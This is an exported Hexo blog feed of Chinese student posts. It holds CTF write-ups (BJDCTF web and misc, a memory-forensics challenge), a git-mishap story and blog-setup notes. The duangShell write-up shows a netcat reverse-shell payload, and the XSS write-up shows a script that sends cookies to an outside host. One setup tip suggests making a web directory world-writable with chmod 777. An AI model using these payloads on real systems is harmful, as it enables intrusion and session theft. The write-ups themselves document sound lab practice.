<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/21/BJDCTF-2nd-wp/21.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="duangShell"><a href="#duangShell" class="headerlink" title="duangShell"></a>duangShell</h3><p>开始是个vim文件泄露，而且没走寻常路，dirsearch也没扫出来</p>
<p>备份文件在/.index.php.swp里，vim -r  恢复一下</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/21/BJDCTF-2nd-wp/18.png" src="/img/loading.gif" class="lazyload"></a>

<p>起初以为是个RCE，绕倒是不难，但是它没回显。。</p>
<p>于是就开始了我漫长的，弹shell之路。试过bash，python，curl，perl，nc…..</p>
<p>应该是我姿势不对。。在比赛结束后Yoshino-s师傅在群里的一句<code>nc ip port -e sh</code>点醒了我。。</p>
<p>接下来就是反弹个shell，在里面找flag就好了</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#自己起的basic linux labs</span></span><br><span class="line">ifconfig</span><br><span class="line">nc -lvp port</span><br><span class="line"><span class="comment">#post的数据</span></span><br><span class="line">girl_friend=nc ip port -e sh</span><br></pre></td></tr></table></figure></div>

<p>最后在<code>./etc/demo/P3rh4ps/love/you</code>中找到flag</p>
<h3 id="假猪套天下第一"><a href="#假猪套天下第一" class="headerlink" title="假猪套天下第一"></a>假猪套天下第一</h3><p>这是一道考HTTP头的题</p>
<p>包含了：Client-ip、Referer、From、Cookie、UA还有Via</p>
<p>先随便登录后查看源代码，提示存在L0g1n.php，进去之后就一层层绕就完事了</p>
<p>XFF被ban了，可以构造Client-ip</p>
<p>UA谷歌一下发现是国外的一道原题，包含Commodore 64就好</p>
<p>最后卡到Via好久，一直以为是Proxy-Authorization要去爆破用户名加密码的base64，失败了。</p>
<p>后来看到群里师傅发的截图才知道Via</p>
<blockquote>
<p>列出从客户端到 OCS 或者相反方向的响应经过了哪些代理服务器，他们用什么协议（和版本）发送的请求。当客户端请求到达第一个代理服务器时，该服务器会在自己发出的请求里面添加 Via 头部，并填上自己的相关信息，当下一个代理服务器 收到第一个代理服务器的请求时，会在自己发出的请求里面复制前一个代理服务器的请求的Via 头部，并把自己的相关信息加到后面， 以此类推，当 OCS 收到最后一个代理服务器的请求时，检查 Via 头部，就知道该请求所经过的路由。</p>
</blockquote>
<p>再开环境做了一遍得到flag</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/03/21/BJDCTF-2nd-wp/19.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="XSS之光"><a href="#XSS之光" class="headerlink" title="XSS之光"></a>XSS之光</h3><p>Git源码泄露，反序列化，xss</p>
<p>开局  gungungun  老祖安人了，查看源码啥也没有，扫一下目录，发现Git泄露</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/03/21/BJDCTF-2nd-wp/23.png" src="/img/loading.gif" class="lazyload"></a>

<p>提示有xss漏洞，利用php原生类构造payload</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = serialize(<span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"&lt;script&gt;window.location.href='http://b9c4633b-9ce6-4937-8b9f-a1b02de9a086.node3.buuoj.cn/'+document.cookie&lt;/script&gt;"</span>));</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure></div>

<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/03/21/BJDCTF-2nd-wp/24.png" src="/img/loading.gif" class="lazyload"></a>

<p>在cookie中得到url编码的flag，解码后得到flag</p>
<p>&nbsp;</p>
<p>这是新生赛？？让我深刻地认识到自己连新生都不如了。（我感觉BJD 1st 也不简单</p>
<p>慢慢来吧，转转型，misc是兴趣，web是饭碗（hhh</p>
]]></content>
      <categories>
        <category>Write_up</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>Crypto</tag>
        <tag>misc</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>高校战&quot;疫&quot;-misc-wp</title>
    <url>/2020/03/09/xctf-misc-wp/</url>
    <content><![CDATA[<h3 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h3><p>虽然计网和OS作业还没写，但是奈何不想写啊。。。于是就写篇博客玩吧。。。。</p>
<p>上周末有一场高校战“疫”赛在adworld平台上举行了，作为联盟学校的一员当然要去水一水啦。</p>
<p>不过恰巧比赛前一天博客炸了，搞到半夜，第二天早上没起来。。</p>
<p>早上起来的时候发现签到题和一道misc已经被做了，伤心！（web是不敢想的，也就水水misc。。</p>
<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><h4 id="简单misc"><a href="#简单misc" class="headerlink" title="简单misc"></a>简单misc</h4><p>思路：文件头修复+文件分离+摩斯密码+base64</p>
<p>用winhex或者010editor或者hxd打开文件，修复文件头为FFD8</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="30%" height="30%" data-src="/2020/03/09/xctf-misc-wp/1.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>好像并没有什么有用的信息，搜一下文件尾FFD9，发现后面有个压缩包</p>
<p>手动提取也行，binwalk也行，foremost也行（最近爱上了手撕，因为不用往linux里放了</p>
<p>解压后发现一段摩斯密码：<code>./.--./../-.././--/../-.-./.../../-/..-/.-/-/../---/-./---/..-./..-/-./../...-/./.-./.../../-/-.--/.--/.-/.-.</code> 解密一下：<code>EPIDEMICSITUATIONOFUNIVERSITYWAR</code></p>
<p>这个就是flag压缩包的密码，解压后得到一传base64：<code>VGgxc19pc19GbGFHX3lvdV9hUkVfcmlnSFQ=</code>解码一下得到flag</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Th1s_is_FlaG_you_aRE_rigHT</span><br></pre></td></tr></table></figure></div>

<p>&nbsp;</p>
<h4 id="隐藏的信息"><a href="#隐藏的信息" class="headerlink" title="隐藏的信息"></a>隐藏的信息</h4><p>反色二维码补全扫码+伪加密+频谱图(高群、低群)电话音分析+base64加密</p>
<p>把二维码里面反色一下，补上三个定位点</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/09/xctf-misc-wp/2.png" src="/img/loading.gif" class="lazyload"></a>

<p>扫出来是：<code>flag{this_is_also_not_flag} 解压密码不在这里0.0！</code></p>
<p>并没有什么卵用，然后还在二维码那张图片里发现了这个</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/09/xctf-misc-wp/3.png" src="/img/loading.gif" class="lazyload"></a>

<p>应该是找出隐藏的信息后base64加密（后面是TOGETYOUFLAG</p>
<p>然后就是那个纯数字的压缩包，我从1位爆破到10位后，感觉不对劲</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="10%" height="10%" data-src="/2020/03/09/xctf-misc-wp/4.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>再高位数跑完怕不是比赛都结束了，放进010一看，淦，伪加密</p>
<p>解开后得到一个音频，放进Audacity看一下，发现正巧是前几天看的<a href="https://www.ichunqiu.com/course/61665" target="_blank" rel="noopener">视频</a>里的（拨号音</p>
<p><a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/09/xctf-misc-wp/5.png" src="/img/loading.gif" class="lazyload"></a><a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/09/xctf-misc-wp/5.png" src="/img/loading.gif" class="lazyload"></a></p>
<p>手解一下</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/03/09/xctf-misc-wp/7.png" src="/img/loading.gif" class="lazyload"></a>

<p>得到一串数字：<code>187485618521</code>，base64加密一下得到flag</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MTg3NDg1NjE4NTIx</span><br></pre></td></tr></table></figure></div>

<p>&nbsp;</p>
<h4 id="ez-mem-amp-usb"><a href="#ez-mem-amp-usb" class="headerlink" title="ez_mem&amp;usb"></a>ez_mem&amp;usb</h4><p>流量分析+内存取证+usb(键盘)</p>
<p>这道题在比赛的时候没做出来（当时还没咋做过内存取证），看<a href="https://blog.xiafeng2333.top/" target="_blank" rel="noopener">夏风师傅的博客</a>又复盘了一遍</p>
<p>在pacp提取出一个压缩包里面有data.vmem（或者binwalk，foremost啥的</p>
<p>扔进kali里，先识别一下操作系统</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f data.vmem imageinfo</span><br></pre></td></tr></table></figure></div>

<p>发现是32位的winxp，列一下进程(pslist无法显示隐藏/终止进程，可以用插件psscan解决</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f data.vmem --profile=WinXPSP2x86 pslist</span><br></pre></td></tr></table></figure></div>

<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/8.png" src="/img/loading.gif" class="lazyload"></a>

<p>当时关键进程抓错了。。没分析IE（一生之敌）。。直接去提取cmd和conime的进程，然后去扫flag字符串</p>
<p>陷进去的时候，那道题已经被解出来了，然后就不想做了。。（小白还是小白。。</p>
<p>关键进程应该是explorer.exe和cmd.exe</p>
<p>先去提取内存中保留的 cmd 命令使用情况</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/10.png" src="/img/loading.gif" class="lazyload"></a>

<p>发现passwd：<code>weak_auth_top100</code></p>
<p>然后用iehistory查看ie浏览器使用情况发现没有信息，于是用editbox查看输入框信息</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/9.png" src="/img/loading.gif" class="lazyload"></a>

<p>发现ie访问的地址是 “C:\Documents and Settings\Administrator”</p>
<p>于是用filescan搜索文件，grep过滤包含<code>Administrator</code>的地址</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f data.vmem --profile=WinXPSP2x86 filescan | grep <span class="string">"Administrator"</span></span><br></pre></td></tr></table></figure></div>

<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/11.png" src="/img/loading.gif" class="lazyload"></a>

<p>发现flag.img，提取出来</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f data.vmem --profile=WinXPSP2x86 dumpfiles -Q 0x0000000001155f90 -n --dump-dir=./</span><br></pre></td></tr></table></figure></div>

<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/03/09/xctf-misc-wp/12.png" src="/img/loading.gif" class="lazyload"></a>

<p>其实当时我也过滤了好多。。但是过滤的都是zip、rar、png、jpg、txt、pacp啥的。。没想过img文件（其实过滤flag也行</p>
<p>得到文件file.None.0xff425090.dat，修改后缀为img，把里面的东西提取一下</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/03/09/xctf-misc-wp/13.png" src="/img/loading.gif" class="lazyload"></a>

<p>得到一个加密的压缩包，密码就是<code>weak_auth_top100</code>（我还以为是弱口令爆破，试了两组后就放弃了</p>
<p>解压得到usbdata.txt ，网上有脚本可以分析，贴个<a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9473808.html" target="_blank" rel="noopener">网址</a>，大佬分析的挺全面的</p>
<p>脚本跑完后得到flag</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;69200835784ec3ed8d2a64e73fe913c0&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="武汉加油"><a href="#武汉加油" class="headerlink" title="武汉加油"></a>武汉加油</h4><p>能力不够，这个是真不会（挺正能量一题，哈哈哈哈哈</p>
<p>提取到flag.exe就不会了，IDA分析不会。。运行的时候倒是发现六个输入接回车后会输出一些无规则字符。。</p>
<p>赛后讨论的时候才知道加了个VMP壳？。。</p>
<p>然后群里的师傅发现了这个</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/09/xctf-misc-wp/15.png" src="/img/loading.gif" class="lazyload"></a>

<p>还有这个</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/09/xctf-misc-wp/15.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>misc新题型解锁：开心猜猜猜！</p>
<p>最后我：</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/09/xctf-misc-wp/16.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>二更：官方wp</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/17.png" src="/img/loading.gif" class="lazyload"></a>

<p>其中用steghide爆破的密码为：ctf</p>
<p>u1s1，还不如去猜flag……..</p>
<p>&nbsp;</p>
<p>希望下次misc能多做出来几道，嘿嘿嘿！</p>
]]></content>
      <categories>
        <category>Write_up</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>misc</tag>
        <tag>xctf</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次自闭经历</title>
    <url>/2020/03/07/A-painful-experience/</url>
    <content><![CDATA[<p>记昨晚我的一次惨痛经历</p>
<h4 id="事件经过"><a href="#事件经过" class="headerlink" title="事件经过"></a>事件经过</h4><p>因为我是在服务器和Github上同时更新博客的，所以在昨天配置完善好新加的主题后</p>
<p>先deploy到了Gitpage上，可以、不错很成功，然后就是往服务器上放了</p>
<p>嗯，hexo clean g d一气呵成。。。访问网站。。。</p>
<p>？？？？？？？？？</p>
<p>此时问题出现了，网站内容没更新！！！</p>
<p>再刷新几次试试。。。还是没有！！！！</p>
<p>回来再部署一次！一定是姿势不对！</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="10%" height="10%" data-src="/2020/03/07/A-painful-experience/5.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>淦！！为啥还是没有，研究一下hexo d之后的内容。。</p>
<p>“Branch ‘master’ set up to track remote branch ‘master’ from”？？？？？？</p>
<p>百度一下，奥！！原来是分叉了，操作一番。。。。</p>
<p>在一窍不通的情况下试验了status、commit、merge、branch、add、push、checkout、push………</p>
<p>嘿！还是不行？？这时一段代码来了！！</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clean -f -d</span><br></pre></td></tr></table></figure></div>

<p>就是它！！就是它！！它摧毁了我的hexo，它删掉了我辛辛苦苦配置了很久的next和butterfly</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="15%" height="15%" data-src="/2020/03/07/A-painful-experience/1.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>第一反应woc！！！赶紧去回收站看看，有救没？？有救没？？？</p>
<p>没有了！！！5555草5555！！！</p>
<p>于是悲伤地卸掉hexo打算重新来过</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:80%;" data-src="/2020/03/07/A-painful-experience/3.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>但是再下下来后，发现hexo s连TM自己本地的4000端口都看不来了！！（急了急了脑子没了</p>
<p>那时候已经一点多了，我悲伤地发出了一篇纪念我短暂博客生涯的说说</p>
<p>那时已经在看Ghost怎么搭建了（但是说真的还是放不下hexo，作业那么多，也没有重头再来的勇气了</p>
<p>这时一位学姐的评论，又让我看到blog转生的希望</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/07/A-painful-experience/4.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>DiskGenius文件数据恢复工具，然后就去扫我的磁盘</p>
<p>但是有用的只找到了一部分，很多都丢了（像styl文件、yml文件</p>
<p>比较惊喜的还是把自己之前发博客写的md文件找到了（很重要，没这个我贼难受，懒得copy了</p>
<p>这时时间来到了3点多钟，我不甘心的睡下了，仿佛看开了，其实脑子里全都是</p>
<p>“Branch ‘master’ set up to track remote branch ‘master’ from”。。。。。。。。。</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/07/A-painful-experience/6.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>时间来到了今天，早上爬起来水了道战疫的misc后。。</p>
<p>淦！我不甘心！爷要从头开始！！！（md，要不是这事，我OS实验一应该写的差不多了</p>
<p>经过一下午的复原。。。。我努力把它变成了原来的样子。。。。</p>
<p>hexo clean g d。。！！？？还是之前的样子？？？？</p>
<p>这次又去研究了下分叉，切到.deploy<code>git branch -a</code>。。。就一个master呀</p>
<p><code>ssh -v git@xx.xx.xx.xx</code>在服务器里切到blog.git。。。就一个master呀</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="15%" height="15%" data-src="/2020/03/07/A-painful-experience/7.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>WinSCP连上服务器，看一下文件更新时间？？是今天下午啊！没错呀！</p>
<p>此时的我意识到了问题的不对劲</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/07/A-painful-experience/8.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>每次在Edge进博客进得都很快，我知道可能是有缓存之类的，但是清除缓存后好像没并没有什么卵用</p>
<p>于是我打算换一个浏览器进入一下我的博客（  Firefox启动，Google启动</p>
<p>进入博客。。无法访问？？？？？？？？</p>
<p>换一个子域名，进去了！更新了！！？？</p>
<p>我突然想到了我昨天下午搞的骚东西——CDN，好像没搞完就放那不管了</p>
<p>接下来我发现我的域名解析暂停了没开，CDN暂停了没删</p>
<p>真相只有一个</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="30%" height="30%" data-src="/2020/03/07/A-painful-experience/9.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>Edge是个 随便！！（好吧，其实是我菜，但是edge浏这个览器连我域名没开解析都能进去的机制属实恶心</p>
<p>还有就是为啥我拿dl进去是更新的状态，自己的ip却不更新的（我咋觉得还跟上次扫目录有关。。</p>
<p>&nbsp;</p>
<p>以后一定要提前备份！！</p>
<p>还有在这插个眼，以后再在git上犯重大错误就T回来扇自己</p>
<p><a href="https://www.runoob.com/git/git-tutorial.html" target="_blank" rel="noopener">Git 菜鸟教程</a></p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>cdn</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker安装(learning)</title>
    <url>/2020/03/02/Docker-learning/</url>
    <content><![CDATA[<p>三战Centos 转win10，然而跟虚拟机冲突，再回去呗</p>
<p>还有因为项目要用到，面对现实就完了</p>
<a id="more"></a>

<hr>
<h5 id="事件记录"><a href="#事件记录" class="headerlink" title="事件记录"></a>事件记录</h5><p>curl太慢（卡着卡着停了）、python2退休（确实不方便）、pip安装不成功</p>
<p>权限赋予 chmod、教程没啥说的下面挺全</p>
<p>学习过程再更，（众所周知，安装≈学会）</p>
<p><a href="/img/loading.gif" data-fancybox="group" data-caption class="fancybox"><img alt data-src="/2020/03/02/Docker-learning/t.jpg" src="/img/loading.gif" class="lazyload" title></a></p>
<h5 id="相关网址："><a href="#相关网址：" class="headerlink" title="相关网址："></a>相关网址：</h5><p><a href="https://blog.csdn.net/deng624796905/article/details/86493330" target="_blank" rel="noopener">Docker入门</a></p>
<p><a href="https://blog.csdn.net/zzq060143/article/details/91050272" target="_blank" rel="noopener">Win10中docker的安装与使用</a></p>
<p><a href="https://blog.csdn.net/weixin_44725156/article/details/104403204" target="_blank" rel="noopener">Centos7安装Docker Compose(pip方式安装)</a></p>
<h5 id="杂记"><a href="#杂记" class="headerlink" title="杂记"></a>杂记</h5><p>虽然自己的博客也没啥跟外界的密码资料传输，但还是换了个https，安全就完事了，<a href="https://www.jianshu.com/p/8046a12fec4a" target="_blank" rel="noopener">教程</a></p>
<p>不要扫自己的ali服务器，会封一段时间ip</p>
<p>一个新公测的CTF网站  <a href="https://www.ctfhub.com/" target="_blank" rel="noopener">ctfhub</a></p>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-misc-wp</title>
    <url>/2020/03/01/buuctf-misc-wp/</url>
    <content><![CDATA[<p>这篇blog来记录在BUUCTF上做的一些有趣的misc题。（部分wp，持续更新ing）</p>
<p>学啥web，misc不好玩了吗？</p>
<a id="more"></a>

<p>不着急，有时间就写</p>
<p>太多了，先咕着</p>
]]></content>
      <categories>
        <category>Write_up</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>misc</tag>
        <tag>buuctf</tag>
      </tags>
  </entry>
  <entry>
    <title>My First Blog</title>
    <url>/2020/02/15/My-first/</url>
    <content><![CDATA[<p>此篇纪念一下BTIS博客的成功搭建。<!--肯定不是因为我太菜，无fk写--></p>
<p>Completed？&emsp; No，This is just the beginning！</p>
<a id="more"></a>

<hr>
<p>这里讲讲我搭建地时候遇到的问题吧：</p>
<h3 id="主题选择"><a href="#主题选择" class="headerlink" title="主题选择"></a>主题选择</h3><p>本来选的是Miccall，发现网上这种组件添加和拓展的教程有点少，最后还是选择了<del>最大众的Next主题</del>butterfly（二更。<del>（功能那么多、教程那么多，它不香吗？</del>（插件插得再多还是有、丑，便捷无法战胜我的审美……butterfly真香</p>
<h3 id="npm换源"><a href="#npm换源" class="headerlink" title="npm换源"></a>npm换源</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm config set registry https:&#x2F;&#x2F;registry.npm.taobao.org</span><br></pre></td></tr></table></figure></div>

<p>换成淘宝的源会好很多</p>
<h3 id="自定义配置文件"><a href="#自定义配置文件" class="headerlink" title="自定义配置文件"></a>自定义配置文件</h3><p>如果想自定义一些自己的样式，而你的版本恰是Next7.X的话（目前最新的Next）。你会发现很多文章中提及的custom文件（可以自由编辑样式的一个文件）没有了。这时你可以在根目录下的source文件下面新建一个_data文件夹，然后在里面新建建一个styles.styl，并在主题配置里设置一下（如下图），这样你就可以在里面加一些自定义的代码了。</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:80%;" data-src="/2020/02/15/My-first/1.png" src="/img/loading.gif" class="lazyload"></a>



<h3 id="注意用户切换"><a href="#注意用户切换" class="headerlink" title="注意用户切换"></a>注意用户切换</h3><p>在往服务器部署时注意git用户和root用户的切换，<a href="https://blog.csdn.net/baiyuwujia/article/details/80648554?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">注意一下git的默认目录</a>。还有就是公钥传递，如果之前传递过，记得删除本地电脑.ssh里面的known_hosts文件。（也许只有我这种不懂Linux的小白会踩这种坑吧）</p>
<h3 id="Linux用户删除"><a href="#Linux用户删除" class="headerlink" title="Linux用户删除"></a>Linux用户删除</h3><p>如果和我一样在Linux里一气之下误删git用户文件的话可以用看看<a href="https://blog.csdn.net/luxiaosi520/article/details/90483981?utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">这篇博客</a>（无能狂怒）</p>
<h3 id="403解决"><a href="#403解决" class="headerlink" title="403解决"></a>403解决</h3><p>最后如果你在本地和服务端都搭好但是网页是403，而且www/website目录下没有文件的话可以试着吧www/website的权限转让给git，或者直接777公开，然后再在本地进行hexo d操作，就可以看到网页了。</p>
<h3 id="搭建教程"><a href="#搭建教程" class="headerlink" title="搭建教程"></a>搭建教程</h3><p>1.<a href="https://blog.csdn.net/sinat_37781304/article/details/82729029" target="_blank" rel="noopener">搭Github page</a></p>
<p>2.<a href="https://blog.csdn.net/NoCortY/article/details/99631249?utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">搭服务器端</a></p>
<p>3.<a href="https://www.jianshu.com/p/f054333ac9e6" target="_blank" rel="noopener">Next比较全的美化教程</a></p>
<p>4.<a href="https://jerryc.me/posts/21cfbf15/#%E5%BF%AB%E9%80%9F%E9%96%8B%E5%A7%8B" target="_blank" rel="noopener">Butterfly美化</a></p>
<!--服务器太脆经不起黑，俺不会维护，还望各位手下留情-->]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
</search>
